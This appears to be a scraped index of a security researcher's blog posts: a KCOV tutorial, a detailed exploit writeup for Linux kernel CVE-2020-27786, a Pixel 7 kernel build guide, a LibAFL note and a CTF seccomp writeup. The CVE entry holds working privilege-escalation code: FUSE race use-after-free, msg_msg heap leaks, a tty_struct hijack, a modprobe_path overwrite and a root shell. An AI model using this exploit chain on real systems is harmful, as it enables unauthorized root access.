KCOV_INIT_TRACE _IOR('c', 1, unsigned long)#define KCOV_ENABLE _IO('c', 100)#define KCOV_DISABLE _IO('c', 101)#define COVER_SIZE (64 &lt;&lt; 10)#define KCOV_TRACE_PC 0#define KCOV_TRACE_CMP 1#define AMD64_PREV_INSTR_SIZE 5int main(int argc, char **argv){ int fd; unsigned long *cover, n, i; /* A single fd descriptor allows coverage collection on a single * thread. */ fd = open(\"/sys/kernel/debug/kcov\", O_RDWR); if (fd == -1) perror(\"open\"), exit(1); /* Setup trace mode and trace size. */ if (ioctl(fd, KCOV_INIT_TRACE, COVER_SIZE)) perror(\"ioctl\"), exit(1); /* Mmap buffer shared between kernel- and user-space. */ cover = (unsigned long *)mmap(NULL, COVER_SIZE * sizeof(unsigned long), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if ((void *)cover == MAP_FAILED) perror(\"mmap\"), exit(1); /* Enable coverage collection on the current thread. */ if (ioctl(fd, KCOV_ENABLE, KCOV_TRACE_PC)) perror(\"ioctl\"), exit(1); /* Reset coverage from the tail of the ioctl() call. */ __atomic_store_n(&amp;cover[0], 0, __ATOMIC_RELAXED); /* That's the target syscal call. */ read(-1, NULL, 0); /* Read number of PCs collected. */ n = __atomic_load_n(&amp;cover[0], __ATOMIC_RELAXED); std::ofstream kcov_s(\"./kcov.txt\"); for (i = 0; i &lt; n; i++) { /* Make sure address leads with 0x and substract 5 to get previous instruction address for syz-cover parser */ kcov_s &lt;&lt; std::showbase &lt;&lt; std::hex &lt;&lt; cover[i + 1] - AMD64_PREV_INSTR_SIZE &lt;&lt; std::endl; } /* Disable coverage collection for the current thread. After this call * coverage can be enabled for a different thread. */ if (ioctl(fd, KCOV_DISABLE, 0)) perror(\"ioctl\"), exit(1); /* Free resources. */ if (munmap(cover, COVER_SIZE * sizeof(unsigned long))) perror(\"munmap\"), exit(1); if (close(fd)) perror(\"close\"), exit(1); return 0;}Running Test BinaryTransfer kcov_test to vm and run it.From same [syzkaller installtion guide](ssh -i $IMAGE/bullseye.id_rsa -p 10021 -o “StrictHostKeyChecking no” root@localhost)it tells you how you can ssh and scp to the vmSSHssh -i $IMAGE/bullseye.id_rsa -p 10021 -o \"StrictHostKeyChecking no\" root@localhostSCPscp -i $IMAGE/stretch.id_rsa -P 10021 -o \"StrictHostKeyChecking no\" &lt;transfer program&gt; root@localhost:&lt;transfer_path&gt;Running syz-cover on kcov.txtkcov_test should have created kcov.txt under same directory. Grab kcov.txt from VM to your host so you can run syz-cover.syz-cover should look something like this below. It needs to start with 0x. Also, address should all point to CALL __sanitizer_cov_trace_pc. Like mentioned earlier, kcov by default gives you addres after CALL __sanitizer_cov_trace_pc but syz-cover parses address at CALL instruction.0xffffffff81b3a1210xffffffff81b39f080xffffffff81bb41f10xffffffff81bb00640xffffffff81bb02e40xffffffff81bb02c10xffffffff81bb42440xffffffff81b3a0150xffffffff810e53a70xffffffff810e53d80xffffffff810e54180xffffffff810e5400Disassembly at 0xffffffff81b3a121 (First KCOV)Running syz-coverNote that the reason why you need absolute path is because there is bug where it will break if you don’t in earlier version of this tool. Fixed in this issuesyz-cover --kernel_src &lt;absolute_linux_kernel_path&gt; --kernel_obj &lt;absolute_linux_kernel_path&gt; kcov.txt Check ResultMake sure SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) is highlighted under fs/read_write.c" }, { "title": "CVE-2020-27786 FUSE UaF", "url": "/posts/cve-2020-27786/", "categories": "linux_kernel", "tags": "nday, fuse, msg_msg, tty_struct, modprobe_path, shm_file_data", "date": "2023-04-26 00:00:00 -0400", "snippet": "OverviewI was looking for nday that I can use to learn more about FUSE since userfaultfd technique is dead in lastest kernel :(. My good friend c0ld21 was porting kiks PoC of CVE-2020-27786 which i...", "content": "OverviewI was looking for nday that I can use to learn more about FUSE since userfaultfd technique is dead in lastest kernel :(. My good friend c0ld21 was porting kiks PoC of CVE-2020-27786 which is written for 4.9.223 to 5.6.13 and I scheme through the original PoC and thought it was a good candidate to learn more about FUSE. The reason being it triggers UaF via race condition through userfaultfd.In this blog I will explain how you can use FUSE to trigger UaF and use msg_msg to leak kernel address and use tty_struct to write modprobe_path to get LPE.Building ExpExp will be is heregit clone https://github.com/elbiazo/CVE-2020-27786.gitcd CVE-2020-27786cmake -S . -B build -G Ninjacmake --build buildIf it doesn’t compile you would likely need to install FUSEapt-get install fuseapt-get install libfuse-devBuilding Linux KernelYou can follow syzkaller guide. TLDR; Instead of doing make defconfig, you can just copy config_5.6.13 from CVE-2020-27786 repo to .config then do make olddefconfig and make -jnprocRunning ExpUpdate exp.cc code /home/user/win to your own path. example: /home/biazo/winpwn::modprobe_path::init(\"/tmp/xx\", \"/tmp/dummy\", \"/home/user/win\");pwn::modprobe_path::trigger(\"/tmp/dummy\", \"/home/user/win\");Copy over exp, kallsyms.txt and win binary to directory you updated above and run it.BugOpening the DeviceYou can open the character driver from path /dev/snd/midiC0D*. Any of those should work.fopsstatic const struct file_operations snd_rawmidi_f_ops ={\t.owner =\tTHIS_MODULE,\t.read =\t\tsnd_rawmidi_read,\t.write =\tsnd_rawmidi_write,\t.open =\t\tsnd_rawmidi_open,\t.release =\tsnd_rawmidi_release,\t.llseek =\tno_llseek,\t.poll =\t\tsnd_rawmidi_poll,\t.unlocked_ioctl =\tsnd_rawmidi_ioctl,\t.compat_ioctl =\tsnd_rawmidi_ioctl_compat,};SNDRV_RAWMIDI_IOCTL_PARAMS IOCTLSNDRV_RAWMIDI_IOCTL_PARAMS calls resize_runtime_buffer that will update the runtime-&gt;buffer (device struct that holds the buffer) with a new buffer. Then it will free the old one. We also control the size of the new buffer which is great.flowchart LR1[snd_rawmidi_ioctl] --&gt; snd_rawmidi_output_params --&gt; resize_runtime_bufferWrite FunctionWriting to device driver will copy the user data into runtime-&gt;buffer mentioned from above at function snd_rawmidi_kernel_write1. it will use copy_from_user.flowchart LR1[snd_rawmidi_write] --&gt; snd_rawmidi_kernel_write1 --&gt; copy_from_userWrite Primitive with UaF (Use After Free)By default, runtime-&gt;buffer is allocated with size 4096(PAGE_SIZE). But we can control the size of that using the SNDRV_RAWMIDI_IOCTL_PARAMS.So if we create a FUSE and try to write to the device, when it hits the copy_from_user it will pause it there and wait for user to handle the fault.While copy_from_user is paused, if we call SNDRV_RAWMIDI_IOCTL_PARAMS, it will free the current runtime-&gt;buffer and allocate it with a new memory. However, the copy_from_user is still paused and it will continue to copy the user data into the old runtime-&gt;buffer which is now freed. This will trigger UaF Write.We now should be able to spray the memory with size of runtime-&gt;buffer with any of kernel data we want since we also control the size of runtime-buffer with IOCTL.flowchart TD1[write with FUSE buffer] --&gt; 2[On write FUSE handler, free runtime-&gt;buffer] --&gt; 3[Spray memory with kernel data that matches runtime-&gt;buffer] --&gt; 4[Continue copy_from_user] --&gt; 5[UaF Write]ExploitSetupPinning CPUFirst you want to pin the cpu so that main and thread are all in same cpu context. Else, you can’t do UaF. CPU_ZERO(&amp;pwn_cpu); CPU_SET(0, &amp;pwn_cpu);andif (sched_setaffinity(0, sizeof(cpu_set_t), &amp;pwn_cpu)){ fatal(\"sched_setaffinity\");}Create FUSEYou can read more about it in pawnyable or LukeGix Blogon how to create FUSE. Essentially, you want to create handler for getattr, open and read.File Operations for FUSEstatic struct fuse_operations fops = { .getattr = getattr_callback, .open = open_callback, .read = read_callback,};CVE_2020_27786 Constructor and Destructorclass CVE_2020_27786{ // crate fuse thread pthread_t ftid;public: LinKern kern{}; CVE_2020_27786() { pthread_create(&amp;ftid, NULL, fuse_thread, NULL); // wait for fuse to be ready while (!fuse_ready) { } info(\"fuse ready\"); }... ~CVE_2020_27786() { info(\"cleaning up fuse\"); // exit fuse pthread_kill(ftid, SIGINT); info(\"cleaned up fuse\"); // clean up all the sprays // or else you will get a kernel panic // also you don't wana close it too early so we do it here for (auto spray : total_sprays) { close(spray); } }}Leaking Kernel Address using UaF and msg_msgResource for msg_msg technique by willisroot and popov are good if you don’t know this trick already.Code section for this is in function call leak_base() and fuse handler read_callback() -&gt; if (strcmp(path, \"/pwn\") == 0)flowchart LR1[leak_base] --&gt; 2[read_callback] --&gt; 3[read_callback's /pwn path section] We will create msg_msg with size 0x1010 (PAGE_SIZE + 0x10) so that we can have kmalloc-4096 and kmalloc-32 allocated. We send_msg(qid, message, size - 0x30, 0); subtract 0x30 since that is the header size. *It really should be subtracting 0x38. 0x30(msg_msg header) - 0x8 (msg_msgseg). Spray kmalloc-32 with shm_file_data so that we can leak the init_ipc_ns address to get kernel base. Use UaF write to overwrite m_ts with bigger value so that we can read after our kmalloc-32 pointer. Use get_msg() to read multiple shm_file_data’s kmalloc-32 pointer after our’s from msg_msg. Find init_ipc_ns address from shm_file_data pointer so that we can calculate kernel base.UaF Write to Change m_ts msg_msg Sizemsg_header evil;size = 0x1400;memset((void *)&amp;evil, 0, sizeof(msg_header));evil.ll_next = (void *)0x4141414141414141;evil.ll_next = (void *)0x4242424242424242;evil.m_type = 1;evil.m_ts = size;memset(buffer, 0, sizeof(buffer));memcpy(buffer, (void *)&amp;evil, 0x20);// here we override the overlapped msg_msg with our own buffermemcpy(buf, buffer, 0x20);return 0x20;Reading kmalloc-32 pointers to get init_ipc_ns addressOnce we overwrite the size, next time we call get_msg() (which calls msgrcv), we will get more datachar recieved[0x2000] = {0};// max size before we use msg_seg. (if we go over this we will just segfault)int size = 0x2000;// we should recv more nowget_msg(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);uint64_t init_ipc_ns = 0;int found_ipc_ns = 0;// for (int i = 0xff8 / 8; i &lt; (0xff8 / 8) + 0x10; i++)for (int i = 0xf00 / 8; i &lt; size / 8 &amp;&amp; i &lt; 0x1200 / 8; i++){ init_ipc_ns = *(uint64_t *)(recieved + i * 8); printf(\"[%u]: %p\\n\", i, (void *)init_ipc_ns); if ((init_ipc_ns &amp; 0xffff) == (kern.find_sym(\"./kallsyms.txt\", \"init_ipc_ns\") &amp; 0xffff)) { found_ipc_ns = 1; break; }}Leaking Heap AddressIt will be similar to leaking kernel address. Instead of spraying with shm_file_data we will use msg_msg’s msg_seg kmalloc-512 to leak kmalloc-512 pointer. The reason why i choose kmalloc-512 is because it seemed less used then other ones such as kmalloc-4096 or kmalloc-1024.With this heap leak, we have control over user controlled heap (msg_msg kmalloc-512). We can use this pointer to write data in [msg_msg-&gt;data] and point our pc to it if we want.Code section for this is in function call leak_kmalloc_4096() and fuse handler read_callback() -&gt; if (strcmp(path, \"/heap\") == 0)flowchart LR1[leak_kmalloc_4096] --&gt; 2[read_callback] --&gt; 3[read_callback's /heap path section]Creating kmalloc-512 and overriding m_ts msg_msg Sizemsg_msg_next_heap_groom(0x200, 10, 0);// allocate over old chunk;send_msg(qid, message, size - 0x30 - 0x8, 0);// debug();msg_header evil;size = 0x1400;memset((void *)&amp;evil, 0, sizeof(msg_header));evil.ll_next = (void *)0x4141414141414141;evil.ll_next = (void *)0x4242424242424242;evil.m_type = 1;evil.m_ts = size;memset(buffer, 0, sizeof(buffer));memcpy(buffer, (void *)&amp;evil, 0x20);// here we override the overlapped msg_msg with our own buffermemcpy(buf, buffer, 0x20);return 0x20;Reading kmalloc-512 pointers to find User Controlled Heap Addresschar recieved[0x2000] = {0};// max size before we use msg_seg. (if we go over this we will just segfault)int size = 0x1400;// we should recv more nowget_msg(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);uint64_t cur_addr = 0;uint64_t heap_leak = 0;// for (int i = 0xff8 / 8; i &lt; (0xff8 / 8) + 0x10; i++)for (int i = 0xf00 / 8; i &lt; size / 8; i++){ cur_addr = *(uint64_t *)(recieved + i * 8); printf(\"[%u] @ %u: %p\\n\", i, i * 8, (void *)cur_addr); // this is m_ts of next msg_msg. we want to get ll_prev // typedef struct // { // void *ll_next; // void *ll_prev; // long m_type; // size_t m_ts; // void *next; // void *security; // } msg_header; if (cur_addr == 0x1d0) { heap_leak = *(uint64_t *)(recieved + (i - 2) * 8); break; }}const uint64_t msg_msg_data_offset = 0xc0; // use to be 0x38 but put it in middle for higher chanceif (heap_leak == 0){ printf(\"failed to find leak\\n\"); result = -1; goto cleanup;}println(\"heap leak: {:#X}\", heap_leak + msg_msg_data_offset);kern.syms[\"heap\"] = heap_leak + msg_msg_data_offset;Overriding modprobe_pathNow we have kernel base address as well as user controlled heap address. We will perform modprobe_path override. TLDR; you can overide global varible named modprobe_path. modprobe_path by default points to /sbin/modprobe. You can check it by doing cat /proc/sys/kernel/modprobe.This binary gets called when magic header of program doesn’t match any known header. So if you can replace modprobe_path string with your own program such as /tmp/xx, it will execute that binary as root user. Giving you LPE.Code section for this is in function call leak_kmalloc_4096() and fuse handler read_callback() -&gt; if (strcmp(path, \"/heap\") == 0)flowchart LR1[arb_write] --&gt; 2[read_callback] --&gt; 3[read_callback's /write path section]Arbitary Write 32bit via tty_structThis method is well documented from pawnyable. TLDR; you can use UaF Write again and spray tty_struct. If you override ops with pointer to your own memory (for us, our kmalloc-512), that have array of function pointer, it will call that function. Another cool thing about this trick is that you have control over RCX, RDX, RSI, R08, R12, R14.Therefore, if you can find gadget like mov [rdx], rcx; ret;, you can use this write to jump to that gadget, and perform arbitary write.So for us rdx will be modprobe_path address and rcx will be string literal /tmp/xx. Another gotcha about this technique is that it will write 32 bit at a time so we have to do this technique twice. for /tmp and /xx\\0.Pawnyable Exampleioctl(spray[i], 0xdeadbeef, 0xcafebabe);Results inRCX: 00000000deadbeefRDX: 00000000cafebabeRSI: 00000000deadbeefR08: 00000000cafebabeR12: 00000000deadbeefR14: 00000000cafebabeWriting to modprobe_pathfor (int i = 0; i &lt; sizeof(cmd); i += 4){ for (int j = 0; j &lt; MAX_ATTEMPT; j++) { if (exp.arb_write(mod_path + i, *(unsigned int *)&amp;cmd[i]) == 0) { std::ifstream fs(\"/proc/sys/kernel/modprobe\", std::ifstream::in); std::string path; std::getline(fs, path); std::string correct_path{cmd + i}; // only get substring if it is long enough if (correct_path.size() &gt;= 4) { correct_path = correct_path.substr(i, i + 4); } // check if current_path size is long enough std::string current_path = path.substr(i); if (current_path.size() &gt;= 4) { current_path = path.substr(i, i + 4); } info(format(\"checking if correct path == current path: {} == {}\", correct_path, current_path).c_str()); if (correct_path == current_path) { break; } } info(format(\"Failed to aaw32 at {}. Attempt: {}/{}\", i, j + 1, MAX_ATTEMPT).c_str()); }}kmalloc-512 Heap We control with function pointers for tty_sturct’s opsYou can see that we groom the heap to point to our gadget. With previous step (leaking the kmalloc-512 heap) we have pointer to address holding this data.void msg_msg_next_heap_groom(int size, int n, int type){ char buffer[0x2000], recieved[0x2000]; memset(buffer, 0, sizeof(buffer)); memset(recieved, 0, sizeof(recieved)); msg *message = (msg *)buffer; message-&gt;mtype = type; uint64_t *ptr = (uint64_t *)message-&gt;mtext; uint64_t mov_prdx_rcx_ret = kbase + mov_prdx_rcx_ret_offset; // 0xffffffff81acd98d: mov [rdx], rcx; ret; println(\"[*] mov_prdx_rcx_ret: {:#X}\", mov_prdx_rcx_ret); for (int i = 0; i &lt; size / 8; ++i) { ptr[i] = mov_prdx_rcx_ret; // 0xffffffff81ad464d: mov [rdx], rcx; ret; } int mqids = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); for (int i = 0; i &lt; n; i++) { if (msgsnd(mqids, &amp;message, size - 0x30, 0) != 0) printf(\"[*] Error with msgsnd %d in heap_groom\\n\", mqids); }}Override tty_struct’s ops with kmalloc-512 heap with function pointers to Our Gadgetsif (strcmp(path, \"/write\") == 0){ puts(\"[*] fuse write\"); auto s1 = pwn::kmalloc_1024::tty_struct::spray(20); sprays.insert(sprays.end(), s1.begin(), s1.end()); puts(\"[+] trigger uaf\"); // you have to realloc before fuse resize_buffer(mid_fd, 0x350); auto s2 = pwn::kmalloc_1024::tty_struct::spray(20); sprays.insert(sprays.end(), s2.begin(), s2.end()); char tmp[0x20]; memset(tmp, 0, 0x20); uint64_t *ptr = (uint64_t *)tmp; // it seems that first data to tty_struct is always 0x0000000100005401. ptr[0] = 0x0000000100005401; ptr[1] = 0x0; println(\"[+] heap_leak: {:#X}\", heap_leak); if (heap_leak == 0) error(\"heap_leak is 0\"); for (int i = 2; i &lt; 0x20 / 8; i++) { ptr[i] = heap_leak; } // debug(); // here we override the overlapped msg_msg with our own buffer memcpy(buf, tmp, 0x20); return 0x20;}Getting LPENow if you do cat /proc/sys/kernel/modprobe, you will see that it is /tmp/xx.At this point, now you have arbitary code execution as root. Write some code in any language and place it in /tmp/xx and run dummy program with bad header.For us, we will run win program from below. It will just give us shell.win.cvoid pwn::win(){ char *argv[] = {(char *)\"/bin/sh\", NULL}; char *envp[] = {NULL}; execve(\"/bin/sh\", argv, envp);}#include &lt;kt.h&gt;int main() { pwn::win(); return 0;}Code from exppwn::modprobe_path::init(\"/tmp/xx\", \"/tmp/dummy\", \"/home/user/win\");pwn::modprobe_path::trigger(\"/tmp/dummy\", \"/home/user/win\");Rooting!It might not work the first time. Also it takes few seconds because FUSE is slowwww.InitialKernel Base LeakHeap LeakOverriding modprobe_pathRunning win as root" }, { "title": "Building Pixel 7 AOSP and Android Kernel", "url": "/posts/building-pixel7/", "categories": "android", "tags": "setup", "date": "2023-04-25 00:00:00 -0400", "snippet": "OverviewPurpose of this blog is to build Pixel 7 AOSP and KernelThis blog will build userdebug build with hwasan (hardware address sanitizer). You can check different kind of build variant here.It ...", "content": "OverviewPurpose of this blog is to build Pixel 7 AOSP and KernelThis blog will build userdebug build with hwasan (hardware address sanitizer). You can check different kind of build variant here.It should also work with Pixel 6. Just grab the correct version of AOSP and Kernel.Hardware Pixel (Blog will be using Pixel 7 codename Panther) but should work with different version of pixel with minor tweakSoftware AOSP (Android + Precompiled Kernel) Vendor Drivers (Usually close-source binary such as Modem) Android Kernel (Kernel. Optional only if you want custom .config)Finding AOSP, Vendor Driver and Android Kernel VersionYou can match BUILD ID with AOSP versionDownloading ReposDownloading Android TQ2A.230305.008.A1mkdir aospcd aosprepo init -u https://android.googlesource.com/platform/manifest -b android-13.0.0_r33repo sync -c -j`nproc`Downloading Proprietary Driver for AOSPFind the version from hereOnce aosp is all pulled down grab the driver and extract it.# Inside aosp dir# cd aospwget https://dl.google.com/dl/android/aosp/google_devices-panther-tq2a.230305.008.a1-1b085d99.tgztar xzvf google_devices-panther-tq2a.230305.008.a1-1b085d99.tgz./extract-google_devices-panther.shDownloading Kernelmkdir android-kernelcd android-kernelrepo init -u https://android.googlesource.com/kernel/manifest -b android-gs-pantah-5.10-android13-qpr2repo sync -c -j`nproc`High Level Overview of Building and Flashing custom AOSP and Kernel Build and Flash AOSP with verity and verification disabled. If you don’t do this, you won’t be able to flash custom kernel. (Optional) Check if verity and verification is off using avbctl command. Build Kernel and Verify Kernel Config Flash Kernel using Manual MethodBuilding AOSP and FlashingBuild AOSPAndroid 7.0 and higher includes support for building the entire Android platform with ASan at once. (If you’re building a release higher than Android 9, HWASan is a better choice.)export SANITIZE_TARGET=&lt;option&gt; are not really necessary since we are going to flash custom kernel anyways but it is good to know.Building with HWASANsource build/envsetup.shlunch aosp_panther-userdebugexport SANITIZE_TARGET=hwaddressm -jBuilding with KASANsource build/envsetup.shlunch aosp_panther-userdebugexport SANITIZE_TARGET=addressm -jFlashingGet to fast boot by adb reboot bootloader or holding down power + vol down button for 5 seconds.(Optional) Unlocking FlashIf you havn’t done this before, unlock the flashfastboot flashing unlockFlash everythingMake sure you append --disable-verity --disable-verification or else you are not disabling verity and you will get stuck in bootloop.fastboot flashall -w --disable-verity --disable-verification If you get an error try belowANDROID_PRODUCT_OUT=`pwd` fastboot flashall -w --disable-verity --disable-verification Checking if verity and verification is disabledOnce Android is booted type this in terminal with ADB cable connected# adb to run as root shelladb rootadb shell# Check if verity and verification is disabled# It should say it is disabledavbctl get-verity avbctl get-verificationBuilding KernelUpdate Kernel Config via menuconfigThere are two ways to do this. I recommend using the first methodUsing Fragment and MenuconfigBUILD_CONFIG=private/gs-google/build.config.cloudripper FRAGMENT_CONFIG=./private/gs-google/arch/arm64/configs/cloudripper_gki.fragment ./build/config.sh menuconfigUpdating gki_defconfig (Not Recommended Way)Update android-kernel/private/gs-google/arch/arm64/configs/gki_defconfig with config from below (either KASAN or HWASAN) with CONFIG_KCOVConfig for Fuzzing with KASANNote: Seems like for Pixel 7 HWASAN was already configured as default. I still had to enable CONFIG_KCOV. Check the .config after doing menuconfigTo choose between HWASAN or KASAN it depends on info below:Android 7.0 and higher includes support for building the entire Android platform with ASan at once. (If you’re building a release higher than Android 9, HWASan is a better choice.)Kernel with HWASAN (Hardware Address Sanitizer)# Memory bug detectorCONFIG_KASAN=yCONFIG_KASAN_HW_TAGS=yCONFIG_SLUB=yCONFIG_SLUB_DEBUG=y# Coverage collectionCONFIG_KCOV=yKernel with KASAN (Software Based Address Sanitizer)# Memory bug detectorCONFIG_KASAN=yCONFIG_KASAN_INLINE=yCONFIG_SLUB=yCONFIG_SLUB_DEBUG=y# Coverage collectionCONFIG_KCOV=yChecking the ConfigYou can check if you have valid config by running menuconfig or looking at .config.config path is out/android13-gs-pixel-5.10/private/gs-google/.configandmenuconfig commmand is belowBUILD_CONFIG=private/gs-google/build.config.cloudripper FRAGMENT_CONFIG=./private/gs-google/arch/arm64/configs/cloudripper_gki.fragment ./build/config.sh menuconfigBuild Kernel# cloudripper is another codename for pixel 7.# Change it to correct one for your pixelBUILD_CONFIG=private/gs-google/build.config.cloudripper build/build.sh(OPTIONAL to Speedup Compile Time) Building without LTOYou can disable LTO by setting FAST_BUILD=1 like belowFAST_BUILD=1 BUILD_CONFIG=private/gs-google/build.config.cloudripper build/build.sh(OPTIONAL to Speedup Compile Time) Building without doing mrproperYou can disable mrproper by setting SKIP_MRPROPER=1 like belowSKIP_MRPROPER=1 BUILD_CONFIG=private/gs-google/build.config.cloudripper build/build.shFlashing Kernel (Manual Method)vendor_dlkm.img needs to be flashed in fastbootd, while the other images needs to be flashed via fastboot/bootloader.Get to fastbootd# From running phone: adb reboot fastboot # From fastboot/bootloader: fastboot reboot fastboot Flash vendor_dlkm.imgOnce in fastbootd:fastboot flash vendor_dlkm vendor_dlkm.img then reboot to bootloaderfastboot reboot bootloaderFlash boot.img, dtbo.img and vendor_kernel_boot.imgNow in fastboot (bootloader) flash boot.img, dtbo.img and vendor_kernel_boot.imgfastboot flash boot boot.img fastboot flash dtbo dtbo.img fastboot flash vendor_kernel_boot vendor_kernel_boot.img(Optional Read) Why Manual Method?Instead of copying the *.ko and Image.lz4 like most of blog tells you to do, you can just flash all kernel and kernel modules using fastboot command.Also I could never get it to work like that. It seems like others are having the same issue as well from this fourmBesides, this is way faster anyways if you are doing security research. I think there is two reasons why it didn’t work. It was using vendor_dlkm.img from vendor driver extract instead of using our compiled one. vendor_dlkm.img holds all of vendor driver such as Mali and Exynos drivers. This will cause linux to not load because of kernel uname -r not matching. More on here I don’t think my image had verity and verification disabled. Alot of tutorial such as Magisk and custom rom will tell you to do fastboot flash vbmeta --disable-verity --disable-verification vbmeta.img to disable it. But I think this only works with precompiled AOSP + Kernel. Besides doing this when you are doing flashall is way easier and faster.RecoverySometimes, phone might get into weird state, such as infinite bootloop or getting stuck on google. Shown on this fourmIf this happens you can get to bootloader via adb reboot bootloader or holding down power + vol down button for 5 seconds.Then get the factory images and flash-all.shExtra KnowledgeResourcesPixel 3 Build https://michael137.github.io/2020-04-16-android-kernel/ https://groups.google.com/g/android-building/c/ou630PviyDc Pixel 4 Build https://junsun.net/wordpress/2021/02/build-flash-and-un-flash-aosp-image-on-pixel-phones/Pixel 6 Build https://zhyfeng.github.io/posts/blog-post-2/Syzkaller Buildhttps://source.android.com/docs/core/tests/debug/kasan-kcov?hl=zh-cn" }, { "title": "LibAFL Tuple List", "url": "/posts/libafl-tuple-list/", "categories": "fuzzing", "tags": "libafl", "date": "2023-02-20 00:00:00 -0500", "snippet": "When you are working with LibAFL you will see tuple_list everywhere. It is a way to do static dispatch in Rust because it doens’t support variadic generics.You can do static dispatch like below. Bu...", "content": "When you are working with LibAFL you will see tuple_list everywhere. It is a way to do static dispatch in Rust because it doens’t support variadic generics.You can do static dispatch like below. But the problem with that is when you are writing library, you don’t want to update the actual source everytime someone wants to add new feature.Static Dispatch from feroxfuzzpub enum CorpusType { /// [`Wordlist`] wrapper Wordlist(Wordlist), /// [`DirCorpus`] wrapper Dir(DirCorpus), /// [`RangeCorpus`] wrapper Range(RangeCorpus), /// [`HttpMethodsCorpus`] wrapper HttpMethods(HttpMethodsCorpus),}/// [`Corpus`] implementation for [`CorpusType`] enumimpl Corpus for CorpusType { #[instrument(skip_all, level = \"trace\")] fn add(&amp;mut self, value: Data) { match self { Self::Wordlist(corpus) =&gt; corpus.add(value), Self::Dir(corpus) =&gt; corpus.add(value), Self::Range(corpus) =&gt; corpus.add(value), Self::HttpMethods(corpus) =&gt; corpus.add(value), } } ...You can also do dynamic dispatch and do trait object but that will be done in run time.ExampleFrom tuple_list doc.rs, you can get this example// `TupleList` is a helper trait implemented by all tuple lists.// Its use is optional, but it allows to avoid accidentally// implementing traits for something other than tuple lists.use tuple_list::TupleList; // Define trait and implement it for several primitive types.trait PlusOne { fn plus_one(&amp;mut self);}impl PlusOne for i32 { fn plus_one(&amp;mut self) { *self += 1; } }impl PlusOne for bool { fn plus_one(&amp;mut self) { *self = !*self; } }impl PlusOne for String { fn plus_one(&amp;mut self) { self.push('1'); } } // Now we have to implement trait for an empty tuple,// thus defining initial condition.impl PlusOne for () { fn plus_one(&amp;mut self) {}} // Now we can implement trait for a non-empty tuple list,// thus defining recursion and supporting tuple lists of arbitrary length.impl&lt;Head, Tail&gt; PlusOne for (Head, Tail) where Head: PlusOne, Tail: PlusOne + TupleList,{ fn plus_one(&amp;mut self) { self.0.plus_one(); self.1.plus_one(); }} // `tuple_list!` as a helper macro used to create// tuple lists from a list of arguments.use tuple_list::tuple_list; // Now we can use our trait on tuple lists.let mut tuple_list = tuple_list!(2, false, String::from(\"abc\"));tuple_list.plus_one(); // `tuple_list!` macro also allows us to unpack tuple listslet tuple_list!(a, b, c) = tuple_list;assert_eq!(a, 3);assert_eq!(b, true);assert_eq!(&amp;c, \"abc1\");First you need to define a trait so that each member of tuple list have function you want to call. Then you can call tuplie_list after you impelement (Head, Tail) which calls function one after the other.LibAFLIn libafl, you will often see this method so that it can give user more flexibility to add their own implementation. In libafl_qemu, you can see this on QemuEdgeCoverageHelper.If you look at executor of QemuExecutorimpl&lt;'a, EM, H, OT, QT, S, Z&gt; Executor&lt;EM, Z&gt; for QemuExecutor&lt;'a, H, OT, QT, S&gt;where EM: UsesState&lt;State = S&gt;, H: FnMut(&amp;S::Input) -&gt; ExitKind, S: UsesInput, OT: ObserversTuple&lt;S&gt;, QT: QemuHelperTuple&lt;S&gt;, Z: UsesState&lt;State = S&gt;,{ fn run_target( &amp;mut self, fuzzer: &amp;mut Z, state: &amp;mut Self::State, mgr: &amp;mut EM, input: &amp;Self::Input, ) -&gt; Result&lt;ExitKind, Error&gt; { let emu = Emulator::new_empty(); if self.first_exec { self.hooks.helpers().first_exec_all(self.hooks); self.first_exec = false; } self.hooks.helpers_mut().pre_exec_all(&amp;emu, input); let mut exit_kind = self.inner.run_target(fuzzer, state, mgr, input)?; self.hooks .helpers_mut() .post_exec_all(&amp;emu, input, &amp;mut exit_kind); Ok(exit_kind) }}they have the code self.hooks.helperes().first_exec_all and self.hooks.helpers_mut().pre_exec_all(). This gets passed in in our harness kind of like this let mut hooks = QemuHooks::new( &amp;emu, tuple_list!( QemuEdgeCoverageHelper::default(), ), ); // Create a QEMU in-process executor let executor = QemuExecutor::new( &amp;mut hooks, &amp;mut harness, tuple_list!(edges_observer, time_observer), &amp;mut fuzzer, &amp;mut state, &amp;mut mgr, ) .expect(\"Failed to create QemuExecutor\");You can look at how QemuEdgeCoverageHelper is implemented and implement your own. It will pass QemuHelper argument and that can contain anything that gets updated in the qemu harness. We can use this to filter hitcount or add more option for executor" }, { "title": "UMDCTF 2022", "url": "/posts/umdctf-2022/", "categories": "ctf", "tags": "seccomp, ptrace", "date": "2022-03-07 00:00:00 -0500", "snippet": "Tracestory I am trying to figure out the end of this story, but I am not able to read it. Could you help me figure out what it is? Author: WittsEnd2 0.cloud.chals.io 15148SummaryThis is a seccom...", "content": "Tracestory I am trying to figure out the end of this story, but I am not able to read it. Could you help me figure out what it is? Author: WittsEnd2 0.cloud.chals.io 15148SummaryThis is a seccomp challenge where you have to utilize ptrace to change behavior of child process.AnalysisBinary AnalysisLooking at main function, here are interesting things: Uses seccomp Uses fork Child process calls function called read_story() Parent process then calls read_input() then setup_seccomp() Whatever gets written to read_input() will eventually be called as function in var_1020()Child is forked off before seccomp rules gets applied.Parent process gets input from user then just executes it. (Memory where they store the user function is mmaped with xwr permission)Seccomp Rules AnalysisUsing seccomp-tools, you can dump the seccomp rules line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x18 0xc000003e if (A != ARCH_X86_64) goto 0026 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x15 0xffffffff if (A != 0xffffffff) goto 0026 0005: 0x15 0x13 0x00 0x00000003 if (A == close) goto 0025 0006: 0x15 0x12 0x00 0x00000004 if (A == stat) goto 0025 0007: 0x15 0x11 0x00 0x00000005 if (A == fstat) goto 0025 0008: 0x15 0x10 0x00 0x00000006 if (A == lstat) goto 0025 0009: 0x15 0x0f 0x00 0x0000000a if (A == mprotect) goto 0025 0010: 0x15 0x0e 0x00 0x0000000c if (A == brk) goto 0025 0011: 0x15 0x0d 0x00 0x00000015 if (A == access) goto 0025 